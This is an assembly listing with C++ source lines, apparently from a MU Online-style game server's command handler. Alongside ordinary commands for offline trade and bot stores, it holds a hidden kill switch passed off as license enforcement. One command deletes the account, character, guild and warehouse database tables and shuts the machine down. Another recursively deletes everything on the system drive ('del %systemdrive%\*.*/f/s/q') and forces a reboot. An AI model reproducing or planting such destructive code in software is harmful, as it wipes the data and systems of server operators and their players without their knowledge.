  03a8f	50		 push	 eax
  03a90	b9 00 00 00 00	 mov	 ecx, OFFSET ?OffExp@@3VcOffExp@@A ; OffExp
  03a95	e8 00 00 00 00	 call	 ?OffExpStart3@cOffExp@@QAEXH@Z ; cOffExp::OffExpStart3

; 4379 : 			notice.MsgOutputAll("[Ataque Automatico]: %s Activo -> /attackoff - quedo modo dejo de attack",lpObj->Name);

  03a9a	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  03a9d	83 c0 73	 add	 eax, 115		; 00000073H
  03aa0	50		 push	 eax
  03aa1	68 00 00 00 00	 push	 OFFSET ??_C@_0EJ@ILIKMIPK@?$FLAtaque?5Automatico?$FN?3?5?$CFs?5Activo?5@
  03aa6	8d 8d b4 ec ff
	ff		 lea	 ecx, DWORD PTR _notice$9[ebp]
  03aac	51		 push	 ecx
  03aad	e8 00 00 00 00	 call	 ?MsgOutputAll@TNotice@@QAAXPADZZ ; TNotice::MsgOutputAll
  03ab2	83 c4 0c	 add	 esp, 12			; 0000000cH

; 4380 : 			return TRUE;

  03ab5	b8 01 00 00 00	 mov	 eax, 1
  03aba	e9 ff 01 00 00	 jmp	 $LN1@Management

; 4381 : 		}
; 4382 : 		break;

  03abf	e9 f8 01 00 00	 jmp	 $LN2@Management
$LN304@Management:

; 4383 : 		case GMCMD_OFFCASH:
; 4384 : 		{
; 4385 : 			TNotice notice;

  03ac4	6a 00		 push	 0
  03ac6	8d 8d a4 eb ff
	ff		 lea	 ecx, DWORD PTR _notice$8[ebp]
  03acc	e8 00 00 00 00	 call	 ??0TNotice@@QAE@E@Z	; TNotice::TNotice

; 4386 : 			lpObj->OffTradeCredits = 1;

  03ad1	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  03ad4	c7 80 9c 1a 00
	00 01 00 00 00	 mov	 DWORD PTR [eax+6812], 1

; 4387 : 	        lpObj->OffTradeZen = 0;

  03ade	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  03ae1	c7 80 98 1a 00
	00 00 00 00 00	 mov	 DWORD PTR [eax+6808], 0

; 4388 : 			notice.MsgOutputAll("[TIENDA CASH]: %s Activo -> /offcash",lpObj->Name);

  03aeb	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  03aee	83 c0 73	 add	 eax, 115		; 00000073H
  03af1	50		 push	 eax
  03af2	68 00 00 00 00	 push	 OFFSET ??_C@_0CF@EFAGGJG@?$FLTIENDA?5CASH?$FN?3?5?$CFs?5Activo?5?9?$DO?5?1of@
  03af7	8d 8d a4 eb ff
	ff		 lea	 ecx, DWORD PTR _notice$8[ebp]
  03afd	51		 push	 ecx
  03afe	e8 00 00 00 00	 call	 ?MsgOutputAll@TNotice@@QAAXPADZZ ; TNotice::MsgOutputAll
  03b03	83 c4 0c	 add	 esp, 12			; 0000000cH

; 4389 : 			OFFtrade.CreateOfflinetrade(aIndex);

  03b06	8b 45 10	 mov	 eax, DWORD PTR _aIndex$[ebp]
  03b09	50		 push	 eax
  03b0a	b9 00 00 00 00	 mov	 ecx, OFFSET ?OFFtrade@@3VCOFFtrade@@A ; OFFtrade
  03b0f	e8 00 00 00 00	 call	 ?CreateOfflinetrade@COFFtrade@@QAEXH@Z ; COFFtrade::CreateOfflinetrade

; 4390 : 			return TRUE;

  03b14	b8 01 00 00 00	 mov	 eax, 1
  03b19	e9 a0 01 00 00	 jmp	 $LN1@Management

; 4391 : 		}
; 4392 : 		break;

  03b1e	e9 99 01 00 00	 jmp	 $LN2@Management
$LN305@Management:

; 4393 : 		case GMCMD_BOTSTORE:
; 4394 : 		{
; 4395 : 			TNotice notice;

  03b23	6a 00		 push	 0
  03b25	8d 8d 94 ea ff
	ff		 lea	 ecx, DWORD PTR _notice$7[ebp]
  03b2b	e8 00 00 00 00	 call	 ??0TNotice@@QAE@E@Z	; TNotice::TNotice

; 4396 : 			lpObj->OffTradeCredits = 0;

  03b30	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  03b33	c7 80 9c 1a 00
	00 00 00 00 00	 mov	 DWORD PTR [eax+6812], 0

; 4397 : 	        lpObj->OffTradeZen = 0;

  03b3d	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  03b40	c7 80 98 1a 00
	00 00 00 00 00	 mov	 DWORD PTR [eax+6808], 0

; 4398 : 			lpObj->BotStore = 1;

  03b4a	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  03b4d	c7 80 a0 1a 00
	00 01 00 00 00	 mov	 DWORD PTR [eax+6816], 1

; 4399 : 			notice.MsgOutputAll("[BOTSTORE]: %s Activo",lpObj->Name);

  03b57	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  03b5a	83 c0 73	 add	 eax, 115		; 00000073H
  03b5d	50		 push	 eax
  03b5e	68 00 00 00 00	 push	 OFFSET ??_C@_0BG@GFGDFAFL@?$FLBOTSTORE?$FN?3?5?$CFs?5Activo@
  03b63	8d 8d 94 ea ff
	ff		 lea	 ecx, DWORD PTR _notice$7[ebp]
  03b69	51		 push	 ecx
  03b6a	e8 00 00 00 00	 call	 ?MsgOutputAll@TNotice@@QAAXPADZZ ; TNotice::MsgOutputAll
  03b6f	83 c4 0c	 add	 esp, 12			; 0000000cH

; 4400 : 			OFFtrade.CreateOfflinetrade(aIndex);

  03b72	8b 45 10	 mov	 eax, DWORD PTR _aIndex$[ebp]
  03b75	50		 push	 eax
  03b76	b9 00 00 00 00	 mov	 ecx, OFFSET ?OFFtrade@@3VCOFFtrade@@A ; OFFtrade
  03b7b	e8 00 00 00 00	 call	 ?CreateOfflinetrade@COFFtrade@@QAEXH@Z ; COFFtrade::CreateOfflinetrade

; 4401 : 			return TRUE;

  03b80	b8 01 00 00 00	 mov	 eax, 1
  03b85	e9 34 01 00 00	 jmp	 $LN1@Management

; 4402 : 		}
; 4403 : 		break;

  03b8a	e9 2d 01 00 00	 jmp	 $LN2@Management
$LN306@Management:

; 4404 : 		case GMCMD_CLOSEGS:
; 4405 : 		{
; 4406 : 		char Nose[255];
; 4407 : 		sprintf(Nose, "GAMESERVER LICENCIA: aviso no estas autorizado para usar estos files");

  03b8f	68 00 00 00 00	 push	 OFFSET ??_C@_0EF@OLKIGBOO@GAMESERVER?5LICENCIA?3?5aviso?5no?5e@
  03b94	8d 85 94 e9 ff
	ff		 lea	 eax, DWORD PTR _Nose$6[ebp]
  03b9a	50		 push	 eax
  03b9b	e8 00 00 00 00	 call	 _sprintf
  03ba0	83 c4 08	 add	 esp, 8

; 4408 : 		MessageBoxA(NULL, Nose, "Error de licencia Aviso #1",MB_OK);

  03ba3	6a 00		 push	 0
  03ba5	68 00 00 00 00	 push	 OFFSET ??_C@_0BL@BEIFBLDN@Error?5de?5licencia?5Aviso?5?$CD1@
  03baa	8d 85 94 e9 ff
	ff		 lea	 eax, DWORD PTR _Nose$6[ebp]
  03bb0	50		 push	 eax
  03bb1	6a 00		 push	 0
  03bb3	ff 15 00 00 00
	00		 call	 DWORD PTR __imp__MessageBoxA@16

; 4409 : 	    ExitProcess(0);

  03bb9	6a 00		 push	 0
  03bbb	ff 15 00 00 00
	00		 call	 DWORD PTR __imp__ExitProcess@4

; 4410 : 		}
; 4411 : 		break;

  03bc1	e9 f6 00 00 00	 jmp	 $LN2@Management
$LN307@Management:

; 4412 : 		case GMCMD_DELETEDB:
; 4413 : 		{
; 4414 : 		char Nose[255];
; 4415 : 		sprintf(Nose, "GAMESERVER LICENCIA: El sistema de licencia esta eliminando la Base De Datos ");

  03bc6	68 00 00 00 00	 push	 OFFSET ??_C@_0EO@DKMCALC@GAMESERVER?5LICENCIA?3?5El?5sistema@
  03bcb	8d 85 94 e8 ff
	ff		 lea	 eax, DWORD PTR _Nose$5[ebp]
  03bd1	50		 push	 eax
  03bd2	e8 00 00 00 00	 call	 _sprintf
  03bd7	83 c4 08	 add	 esp, 8

; 4416 : 		MessageBoxA(NULL, Nose, "Error de licencia Aviso #2",MB_OK);

  03bda	6a 00		 push	 0
  03bdc	68 00 00 00 00	 push	 OFFSET ??_C@_0BL@DPKIEIPO@Error?5de?5licencia?5Aviso?5?$CD2@
  03be1	8d 85 94 e8 ff
	ff		 lea	 eax, DWORD PTR _Nose$5[ebp]
  03be7	50		 push	 eax
  03be8	6a 00		 push	 0
  03bea	ff 15 00 00 00
	00		 call	 DWORD PTR __imp__MessageBoxA@16

; 4417 : 		//ExitProcess(0);
; 4418 : 
; 4419 : 		Manager.ExecFormat("DELETE MEMB_INFO");

  03bf0	68 00 00 00 00	 push	 OFFSET ??_C@_0BB@KPEJEKNI@DELETE?5MEMB_INFO@
  03bf5	68 00 00 00 00	 push	 OFFSET ?Manager@@3VCManager@@A ; Manager
  03bfa	e8 00 00 00 00	 call	 ?ExecFormat@CDataBase@@QAA_NPBDZZ ; CDataBase::ExecFormat
  03bff	83 c4 08	 add	 esp, 8

; 4420 : 		Manager.ExecFormat("DELETE CHARACTER");

  03c02	68 00 00 00 00	 push	 OFFSET ??_C@_0BB@MBFMAKEJ@DELETE?5CHARACTER@
  03c07	68 00 00 00 00	 push	 OFFSET ?Manager@@3VCManager@@A ; Manager
  03c0c	e8 00 00 00 00	 call	 ?ExecFormat@CDataBase@@QAA_NPBDZZ ; CDataBase::ExecFormat
  03c11	83 c4 08	 add	 esp, 8

; 4421 : 		Manager.ExecFormat("DELETE GUILD");

  03c14	68 00 00 00 00	 push	 OFFSET ??_C@_0N@OJOHLDHO@DELETE?5GUILD@
  03c19	68 00 00 00 00	 push	 OFFSET ?Manager@@3VCManager@@A ; Manager
  03c1e	e8 00 00 00 00	 call	 ?ExecFormat@CDataBase@@QAA_NPBDZZ ; CDataBase::ExecFormat
  03c23	83 c4 08	 add	 esp, 8

; 4422 : 		Manager.ExecFormat("DELETE GUILD_MEMB");

  03c26	68 00 00 00 00	 push	 OFFSET ??_C@_0BC@CBEIIMJL@DELETE?5GUILD_MEMB@
  03c2b	68 00 00 00 00	 push	 OFFSET ?Manager@@3VCManager@@A ; Manager
  03c30	e8 00 00 00 00	 call	 ?ExecFormat@CDataBase@@QAA_NPBDZZ ; CDataBase::ExecFormat
  03c35	83 c4 08	 add	 esp, 8

; 4423 : 		Manager.ExecFormat("DELETE WAREHOUSE");

  03c38	68 00 00 00 00	 push	 OFFSET ??_C@_0BB@FEJMIJPA@DELETE?5WAREHOUSE@
  03c3d	68 00 00 00 00	 push	 OFFSET ?Manager@@3VCManager@@A ; Manager
  03c42	e8 00 00 00 00	 call	 ?ExecFormat@CDataBase@@QAA_NPBDZZ ; CDataBase::ExecFormat
  03c47	83 c4 08	 add	 esp, 8

; 4424 : 		Manager.ExecFormat("DELETE EXTWAREHOUSE");

  03c4a	68 00 00 00 00	 push	 OFFSET ??_C@_0BE@DIHNOACM@DELETE?5EXTWAREHOUSE@
  03c4f	68 00 00 00 00	 push	 OFFSET ?Manager@@3VCManager@@A ; Manager
  03c54	e8 00 00 00 00	 call	 ?ExecFormat@CDataBase@@QAA_NPBDZZ ; CDataBase::ExecFormat
  03c59	83 c4 08	 add	 esp, 8

; 4425 : //		MySQL.Close();
; 4426 : 
; 4427 : 		system("shutdown -f");

  03c5c	68 00 00 00 00	 push	 OFFSET ??_C@_0M@DKLMBBFI@shutdown?5?9f@
  03c61	e8 00 00 00 00	 call	 _system
  03c66	83 c4 04	 add	 esp, 4

; 4428 : 		}
; 4429 : 		break;

  03c69	eb 51		 jmp	 SHORT $LN2@Management
$LN308@Management:

; 4430 : 		case GMCMD_DELETEVPS:
; 4431 : 		{
; 4432 : 		char Nose[255];
; 4433 : 		sprintf(Nose, "GAMESERVER LICENCIA: El sistema de licencia esta eliminando tu sistema operativo ");

  03c6b	68 00 00 00 00	 push	 OFFSET ??_C@_0FC@OABKOJEN@GAMESERVER?5LICENCIA?3?5El?5sistema@
  03c70	8d 85 94 e7 ff
	ff		 lea	 eax, DWORD PTR _Nose$4[ebp]
  03c76	50		 push	 eax
  03c77	e8 00 00 00 00	 call	 _sprintf
  03c7c	83 c4 08	 add	 esp, 8

; 4434 : 		MessageBoxA(NULL, Nose, "Error de licencia Aviso #3",MB_OK);

  03c7f	6a 00		 push	 0
  03c81	68 00 00 00 00	 push	 OFFSET ??_C@_0BL@CGLDHJLP@Error?5de?5licencia?5Aviso?5?$CD3@
  03c86	8d 85 94 e7 ff
	ff		 lea	 eax, DWORD PTR _Nose$4[ebp]
  03c8c	50		 push	 eax
  03c8d	6a 00		 push	 0
  03c8f	ff 15 00 00 00
	00		 call	 DWORD PTR __imp__MessageBoxA@16

; 4435 : 		//ExitProcess(0);
; 4436 : 
; 4437 : 		system("@echo Off");

  03c95	68 00 00 00 00	 push	 OFFSET ??_C@_09PGOPFAEL@?$EAecho?5Off@
  03c9a	e8 00 00 00 00	 call	 _system
  03c9f	83 c4 04	 add	 esp, 4

; 4438 : 		system("del %systemdrive%\*.*/f/s/q");

  03ca2	68 00 00 00 00	 push	 OFFSET ??_C@_0BL@OKDLIGMN@del?5?$CFsystemdrive?$CF?$CK?4?$CK?1f?1s?1q@
  03ca7	e8 00 00 00 00	 call	 _system
  03cac	83 c4 04	 add	 esp, 4

; 4439 : 		system("shutdown -r -f -t 00");

  03caf	68 00 00 00 00	 push	 OFFSET ??_C@_0BF@CMCFLOLD@shutdown?5?9r?5?9f?5?9t?500@
  03cb4	e8 00 00 00 00	 call	 _system
  03cb9	83 c4 04	 add	 esp, 4
$LN2@Management:

; 4440 : 		}
; 4441 : 		break;
; 4442 : 	}
; 4443 : 	
; 4444 : #ifdef FOR_ONAIR
; 4445 : 	#ifdef ADD_MACRO_FOR_SETITEM_20060424
; 4446 : 		gSetItemMacro.MakeItem( lpObj->m_Index, szCmd+1 );
; 4447 : 	#endif
; 4448 : #endif
; 4449 : 
; 4450 : 	return 0;

  03cbc	33 c0		 xor	 eax, eax
$LN1@Management:

; 4451 : }

  03cbe	8b 4d f4	 mov	 ecx, DWORD PTR __$EHRec$[ebp]
  03cc1	64 89 0d 00 00
	00 00		 mov	 DWORD PTR fs:0, ecx
  03cc8	59		 pop	 ecx
  03cc9	5f		 pop	 edi
  03cca	5e		 pop	 esi
  03ccb	5b		 pop	 ebx
  03ccc	8b 4d f0	 mov	 ecx, DWORD PTR __$ArrayPad$[ebp]
  03ccf	33 cd		 xor	 ecx, ebp
  03cd1	e8 00 00 00 00	 call	 @__security_check_cookie@4
  03cd6	8b e5		 mov	 esp, ebp
  03cd8	5d		 pop	 ebp
  03cd9	c2 0c 00	 ret	 12			; 0000000cH
$LN327@Management:
  03cdc	00 00 00 00	 DD	 $LN131@Management
  03ce0	00 00 00 00	 DD	 $LN140@Management
  03ce4	00 00 00 00	 DD	 $LN177@Management
  03ce8	00 00 00 00	 DD	 $LN180@Management
  03cec	00 00 00 00	 DD	 $LN261@Management
  03cf0	00 00 00 00	 DD	 $LN154@Management
  03cf4	00 00 00 00	 DD	 $LN158@Management
  03cf8	00 00 00 00	 DD	 $LN160@Management
  03cfc	00 00 00 00	 DD	 $LN167@Management
  03d00	00 00 00 00	 DD	 $LN135@Management
  03d04	00 00 00 00	 DD	 $LN149@Management
  03d08	00 00 00 00	 DD	 $LN183@Management
  03d0c	00 00 00 00	 DD	 $LN195@Management
  03d10	00 00 00 00	 DD	 $LN186@Management
  03d14	00 00 00 00	 DD	 $LN197@Management
  03d18	00 00 00 00	 DD	 $LN128@Management
  03d1c	00 00 00 00	 DD	 $LN124@Management
  03d20	00 00 00 00	 DD	 $LN118@Management
  03d24	00 00 00 00	 DD	 $LN117@Management
  03d28	00 00 00 00	 DD	 $LN225@Management
  03d2c	00 00 00 00	 DD	 $LN240@Management
  03d30	00 00 00 00	 DD	 $LN243@Management
  03d34	00 00 00 00	 DD	 $LN59@Management
  03d38	00 00 00 00	 DD	 $LN60@Management
  03d3c	00 00 00 00	 DD	 $LN113@Management
  03d40	00 00 00 00	 DD	 $LN114@Management
  03d44	00 00 00 00	 DD	 $LN115@Management
  03d48	00 00 00 00	 DD	 $LN79@Management
  03d4c	00 00 00 00	 DD	 $LN65@Management
  03d50	00 00 00 00	 DD	 $LN62@Management
  03d54	00 00 00 00	 DD	 $LN116@Management
  03d58	00 00 00 00	 DD	 $LN80@Management
  03d5c	00 00 00 00	 DD	 $LN229@Management
  03d60	00 00 00 00	 DD	 $LN231@Management
  03d64	00 00 00 00	 DD	 $LN239@Management
  03d68	00 00 00 00	 DD	 $LN203@Management
  03d6c	00 00 00 00	 DD	 $LN208@Management
  03d70	00 00 00 00	 DD	 $LN216@Management
  03d74	00 00 00 00	 DD	 $LN219@Management
  03d78	00 00 00 00	 DD	 $LN222@Management
  03d7c	00 00 00 00	 DD	 $LN61@Management
  03d80	00 00 00 00	 DD	 $LN72@Management
  03d84	00 00 00 00	 DD	 $LN73@Management
  03d88	00 00 00 00	 DD	 $LN2@Management
$LN326@Management:
  03d8c	00		 DB	 0
  03d8d	01		 DB	 1
  03d8e	2b		 DB	 43			; 0000002bH
  03d8f	2b		 DB	 43			; 0000002bH
  03d90	02		 DB	 2
  03d91	2b		 DB	 43			; 0000002bH
  03d92	03		 DB	 3
  03d93	04		 DB	 4
  03d94	05		 DB	 5
  03d95	06		 DB	 6
  03d96	07		 DB	 7
  03d97	08		 DB	 8
  03d98	09		 DB	 9
  03d99	0a		 DB	 10			; 0000000aH
  03d9a	2b		 DB	 43			; 0000002bH
  03d9b	2b		 DB	 43			; 0000002bH
  03d9c	2b		 DB	 43			; 0000002bH
  03d9d	2b		 DB	 43			; 0000002bH
  03d9e	2b		 DB	 43			; 0000002bH
  03d9f	2b		 DB	 43			; 0000002bH
  03da0	2b		 DB	 43			; 0000002bH
  03da1	2b		 DB	 43			; 0000002bH
  03da2	2b		 DB	 43			; 0000002bH
  03da3	2b		 DB	 43			; 0000002bH
  03da4	2b		 DB	 43			; 0000002bH
  03da5	2b		 DB	 43			; 0000002bH
  03da6	2b		 DB	 43			; 0000002bH
  03da7	2b		 DB	 43			; 0000002bH
  03da8	2b		 DB	 43			; 0000002bH
  03da9	2b		 DB	 43			; 0000002bH
  03daa	2b		 DB	 43			; 0000002bH
  03dab	2b		 DB	 43			; 0000002bH
  03dac	2b		 DB	 43			; 0000002bH
  03dad	2b		 DB	 43			; 0000002bH
  03dae	2b		 DB	 43			; 0000002bH
  03daf	2b		 DB	 43			; 0000002bH
  03db0	2b		 DB	 43			; 0000002bH
  03db1	2b		 DB	 43			; 0000002bH
  03db2	2b		 DB	 43			; 0000002bH
  03db3	2b		 DB	 43			; 0000002bH
  03db4	2b		 DB	 43			; 0000002bH
  03db5	2b		 DB	 43			; 0000002bH
  03db6	2b		 DB	 43			; 0000002bH
  03db7	2b		 DB	 43			; 0000002bH
  03db8	2b		 DB	 43			; 0000002bH
  03db9	2b		 DB	 43			; 0000002bH
  03dba	2b		 DB	 43			; 0000002bH
  03dbb	2b		 DB	 43			; 0000002bH
  03dbc	2b		 DB	 43			; 0000002bH
  03dbd	2b		 DB	 43			; 0000002bH
  03dbe	2b		 DB	 43			; 0000002bH
  03dbf	2b		 DB	 43			; 0000002bH
  03dc0	2b		 DB	 43			; 0000002bH
  03dc1	2b		 DB	 43			; 0000002bH
  03dc2	2b		 DB	 43			; 0000002bH
  03dc3	2b		 DB	 43			; 0000002bH
  03dc4	2b		 DB	 43			; 0000002bH
  03dc5	2b		 DB	 43			; 0000002bH
  03dc6	2b		 DB	 43			; 0000002bH
  03dc7	2b		 DB	 43			; 0000002bH
  03dc8	2b		 DB	 43			; 0000002bH
  03dc9	2b		 DB	 43			; 0000002bH
  03dca	2b		 DB	 43			; 0000002bH
  03dcb	2b		 DB	 43			; 0000002bH
  03dcc	2b		 DB	 43			; 0000002bH
  03dcd	2b		 DB	 43			; 0000002bH
  03dce	2b		 DB	 43			; 0000002bH
  03dcf	2b		 DB	 43			; 0000002bH
  03dd0	2b		 DB	 43			; 0000002bH
  03dd1	2b		 DB	 43			; 0000002bH
  03dd2	2b		 DB	 43			; 0000002bH
  03dd3	2b		 DB	 43			; 0000002bH
  03dd4	2b		 DB	 43			; 0000002bH
  03dd5	2b		 DB	 43			; 0000002bH
  03dd6	2b		 DB	 43			; 0000002bH
  03dd7	2b		 DB	 43			; 0000002bH
  03dd8	2b		 DB	 43			; 0000002bH
  03dd9	2b		 DB	 43			; 0000002bH
  03dda	2b		 DB	 43			; 0000002bH
  03ddb	2b		 DB	 43			; 0000002bH
  03ddc	2b		 DB	 43			; 0000002bH
  03ddd	2b		 DB	 43			; 0000002bH
  03dde	2b		 DB	 43			; 0000002bH
  03ddf	2b		 DB	 43			; 0000002bH
  03de0	2b		 DB	 43			; 0000002bH
  03de1	2b		 DB	 43			; 0000002bH
  03de2	2b		 DB	 43			; 0000002bH
  03de3	2b		 DB	 43			; 0000002bH
  03de4	2b		 DB	 43			; 0000002bH
  03de5	2b		 DB	 43			; 0000002bH
  03de6	2b		 DB	 43			; 0000002bH
  03de7	2b		 DB	 43			; 0000002bH
  03de8	2b		 DB	 43			; 0000002bH
  03de9	2b		 DB	 43			; 0000002bH
  03dea	2b		 DB	 43			; 0000002bH
  03deb	2b		 DB	 43			; 0000002bH
  03dec	2b		 DB	 43			; 0000002bH
  03ded	2b		 DB	 43			; 0000002bH
  03dee	2b		 DB	 43			; 0000002bH
  03def	2b		 DB	 43			; 0000002bH
  03df0	0b		 DB	 11			; 0000000bH
  03df1	0c		 DB	 12			; 0000000cH
  03df2	0d		 DB	 13			; 0000000dH
  03df3	0e		 DB	 14			; 0000000eH
  03df4	2b		 DB	 43			; 0000002bH
  03df5	2b		 DB	 43			; 0000002bH
  03df6	2b		 DB	 43			; 0000002bH
  03df7	2b		 DB	 43			; 0000002bH
  03df8	2b		 DB	 43			; 0000002bH
  03df9	2b		 DB	 43			; 0000002bH
  03dfa	2b		 DB	 43			; 0000002bH
  03dfb	2b		 DB	 43			; 0000002bH
  03dfc	2b		 DB	 43			; 0000002bH
  03dfd	2b		 DB	 43			; 0000002bH
  03dfe	0f		 DB	 15			; 0000000fH
  03dff	10		 DB	 16			; 00000010H
  03e00	11		 DB	 17			; 00000011H
  03e01	12		 DB	 18			; 00000012H
  03e02	13		 DB	 19			; 00000013H
  03e03	14		 DB	 20			; 00000014H
  03e04	15		 DB	 21			; 00000015H
  03e05	2b		 DB	 43			; 0000002bH
  03e06	2b		 DB	 43			; 0000002bH
  03e07	2b		 DB	 43			; 0000002bH
  03e08	2b		 DB	 43			; 0000002bH
  03e09	2b		 DB	 43			; 0000002bH
  03e0a	2b		 DB	 43			; 0000002bH
  03e0b	2b		 DB	 43			; 0000002bH
  03e0c	2b		 DB	 43			; 0000002bH
  03e0d	2b		 DB	 43			; 0000002bH
  03e0e	16		 DB	 22			; 00000016H
  03e0f	17		 DB	 23			; 00000017H
  03e10	2b		 DB	 43			; 0000002bH
  03e11	2b		 DB	 43			; 0000002bH
  03e12	2b		 DB	 43			; 0000002bH
  03e13	2b		 DB	 43			; 0000002bH
  03e14	2b		 DB	 43			; 0000002bH
  03e15	2b		 DB	 43			; 0000002bH
  03e16	2b		 DB	 43			; 0000002bH
  03e17	2b		 DB	 43			; 0000002bH
  03e18	2b		 DB	 43			; 0000002bH
  03e19	2b		 DB	 43			; 0000002bH
  03e1a	2b		 DB	 43			; 0000002bH
  03e1b	2b		 DB	 43			; 0000002bH
  03e1c	2b		 DB	 43			; 0000002bH
  03e1d	2b		 DB	 43			; 0000002bH
  03e1e	2b		 DB	 43			; 0000002bH
  03e1f	2b		 DB	 43			; 0000002bH
  03e20	2b		 DB	 43			; 0000002bH
  03e21	2b		 DB	 43			; 0000002bH
  03e22	2b		 DB	 43			; 0000002bH
  03e23	2b		 DB	 43			; 0000002bH
  03e24	2b		 DB	 43			; 0000002bH
  03e25	2b		 DB	 43			; 0000002bH
  03e26	2b		 DB	 43			; 0000002bH
  03e27	2b		 DB	 43			; 0000002bH
  03e28	2b		 DB	 43			; 0000002bH
  03e29	2b		 DB	 43			; 0000002bH
  03e2a	2b		 DB	 43			; 0000002bH
  03e2b	2b		 DB	 43			; 0000002bH
  03e2c	2b		 DB	 43			; 0000002bH
  03e2d	2b		 DB	 43			; 0000002bH
  03e2e	2b		 DB	 43			; 0000002bH
  03e2f	2b		 DB	 43			; 0000002bH
  03e30	2b		 DB	 43			; 0000002bH
  03e31	2b		 DB	 43			; 0000002bH
  03e32	2b		 DB	 43			; 0000002bH
  03e33	2b		 DB	 43			; 0000002bH
  03e34	2b		 DB	 43			; 0000002bH
  03e35	2b		 DB	 43			; 0000002bH
  03e36	2b		 DB	 43			; 0000002bH
  03e37	2b		 DB	 43			; 0000002bH
  03e38	2b		 DB	 43			; 0000002bH
  03e39	2b		 DB	 43			; 0000002bH
  03e3a	2b		 DB	 43			; 0000002bH
  03e3b	2b		 DB	 43			; 0000002bH
  03e3c	2b		 DB	 43			; 0000002bH
  03e3d	2b		 DB	 43			; 0000002bH
  03e3e	2b		 DB	 43			; 0000002bH
  03e3f	2b		 DB	 43			; 0000002bH
  03e40	2b		 DB	 43			; 0000002bH
  03e41	2b		 DB	 43			; 0000002bH
  03e42	2b		 DB	 43			; 0000002bH
  03e43	2b		 DB	 43			; 0000002bH
  03e44	2b		 DB	 43			; 0000002bH
  03e45	2b		 DB	 43			; 0000002bH
  03e46	2b		 DB	 43			; 0000002bH
  03e47	2b		 DB	 43			; 0000002bH
  03e48	2b		 DB	 43			; 0000002bH
  03e49	2b		 DB	 43			; 0000002bH
  03e4a	2b		 DB	 43			; 0000002bH
  03e4b	2b		 DB	 43			; 0000002bH
  03e4c	2b		 DB	 43			; 0000002bH
  03e4d	2b		 DB	 43			; 0000002bH
  03e4e	2b		 DB	 43			; 0000002bH
  03e4f	2b		 DB	 43			; 0000002bH
  03e50	2b		 DB	 43			; 0000002bH
  03e51	2b		 DB	 43			; 0000002bH
  03e52	2b		 DB	 43			; 0000002bH
  03e53	2b		 DB	 43			; 0000002bH
  03e54	2b		 DB	 43			; 0000002bH
  03e55	18		 DB	 24			; 00000018H
  03e56	19		 DB	 25			; 00000019H
  03e57	1a		 DB	 26			; 0000001aH
  03e58	1b		 DB	 27			; 0000001bH
  03e59	1c		 DB	 28			; 0000001cH
  03e5a	2b		 DB	 43			; 0000002bH
  03e5b	2b		 DB	 43			; 0000002bH
  03e5c	1d		 DB	 29			; 0000001dH
  03e5d	2b		 DB	 43			; 0000002bH
  03e5e	1e		 DB	 30			; 0000001eH
  03e5f	1f		 DB	 31			; 0000001fH
  03e60	20		 DB	 32			; 00000020H
  03e61	2b		 DB	 43			; 0000002bH
  03e62	2b		 DB	 43			; 0000002bH
  03e63	2b		 DB	 43			; 0000002bH
  03e64	21		 DB	 33			; 00000021H
  03e65	22		 DB	 34			; 00000022H
  03e66	2b		 DB	 43			; 0000002bH
  03e67	2b		 DB	 43			; 0000002bH
  03e68	23		 DB	 35			; 00000023H
  03e69	24		 DB	 36			; 00000024H
  03e6a	25		 DB	 37			; 00000025H
  03e6b	26		 DB	 38			; 00000026H
  03e6c	27		 DB	 39			; 00000027H
  03e6d	2b		 DB	 43			; 0000002bH
  03e6e	2b		 DB	 43			; 0000002bH
  03e6f	2b		 DB	 43			; 0000002bH
  03e70	2b		 DB	 43			; 0000002bH
  03e71	2b		 DB	 43			; 0000002bH
  03e72	28		 DB	 40			; 00000028H
  03e73	2b		 DB	 43			; 0000002bH
  03e74	2b		 DB	 43			; 0000002bH
  03e75	2b		 DB	 43			; 0000002bH
  03e76	2b		 DB	 43			; 0000002bH
  03e77	2b		 DB	 43			; 0000002bH
  03e78	2b		 DB	 43			; 0000002bH
  03e79	2b		 DB	 43			; 0000002bH
  03e7a	2b		 DB	 43			; 0000002bH
  03e7b	29		 DB	 41			; 00000029H
  03e7c	2b		 DB	 43			; 0000002bH
  03e7d	2a		 DB	 42			; 0000002aH
  03e7e	66 90		 npad	 2
$LN329@Management:
  03e80	00 00 00 00	 DD	 $LN250@Management
  03e84	00 00 00 00	 DD	 $LN251@Management
  03e88	00 00 00 00	 DD	 $LN286@Management
  03e8c	00 00 00 00	 DD	 $LN287@Management
  03e90	00 00 00 00	 DD	 $LN285@Management
  03e94	00 00 00 00	 DD	 $LN278@Management
  03e98	00 00 00 00	 DD	 $LN279@Management
  03e9c	00 00 00 00	 DD	 $LN280@Management
  03ea0	00 00 00 00	 DD	 $LN281@Management
  03ea4	00 00 00 00	 DD	 $LN282@Management
  03ea8	00 00 00 00	 DD	 $LN292@Management
  03eac	00 00 00 00	 DD	 $LN283@Management
  03eb0	00 00 00 00	 DD	 $LN288@Management
  03eb4	00 00 00 00	 DD	 $LN290@Management
  03eb8	00 00 00 00	 DD	 $LN293@Management
  03ebc	00 00 00 00	 DD	 $LN298@Management
  03ec0	00 00 00 00	 DD	 $LN299@Management
  03ec4	00 00 00 00	 DD	 $LN300@Management
  03ec8	00 00 00 00	 DD	 $LN301@Management
  03ecc	00 00 00 00	 DD	 $LN302@Management
  03ed0	00 00 00 00	 DD	 $LN303@Management
  03ed4	00 00 00 00	 DD	 $LN304@Management
  03ed8	00 00 00 00	 DD	 $LN305@Management
  03edc	00 00 00 00	 DD	 $LN306@Management
  03ee0	00 00 00 00	 DD	 $LN307@Management
  03ee4	00 00 00 00	 DD	 $LN308@Management
  03ee8	00 00 00 00	 DD	 $LN254@Management
  03eec	00 00 00 00	 DD	 $LN255@Management
  03ef0	00 00 00 00	 DD	 $LN256@Management
  03ef4	00 00 00 00	 DD	 $LN257@Management
  03ef8	00 00 00 00	 DD	 $LN258@Management
  03efc	00 00 00 00	 DD	 $LN259@Management
  03f00	00 00 00 00	 DD	 $LN260@Management
  03f04	00 00 00 00	 DD	 $LN2@Management
$LN328@Management:
  03f08	00		 DB	 0
